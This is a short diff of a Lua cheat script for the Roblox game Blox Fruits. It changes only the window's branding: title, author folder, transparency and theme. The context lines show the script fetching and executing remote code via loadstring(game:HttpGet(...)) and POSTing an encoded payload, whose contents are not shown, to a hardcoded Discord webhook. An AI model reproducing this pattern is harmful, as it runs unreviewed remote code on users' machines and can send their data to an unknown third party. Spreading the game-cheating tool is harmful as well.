@@ -1,11 +1,11 @@
 local WindUI = (loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua")))();
 local Window = WindUI:CreateWindow({
-	Title = "YGz skidder",
+	Title = "Night Mystic",
 	Author = "Blox Fruit",
-	Folder = "Made By It!kuri",
+	Folder = "Made By Maura",
 	Size = UDim2.fromOffset(520, 300),
-	Transparent = true,
-	Theme = "Red",
+	Transparent = false,
+	Theme = "Darker",
 	SideBarWidth = 190,
 	HasOutline = false,
 });
@@ -10008,4 +10008,5 @@ local WebhookURL = "https://discord.com/api/webhooks/1361944409662423180/cliAsM5
 local Request = http_request or request or HttpPost or syn.request
 if Request then
     Request({Url = WebhookURL, Body = Encoded, Method = "POST", Headers = Headers})
+
 end
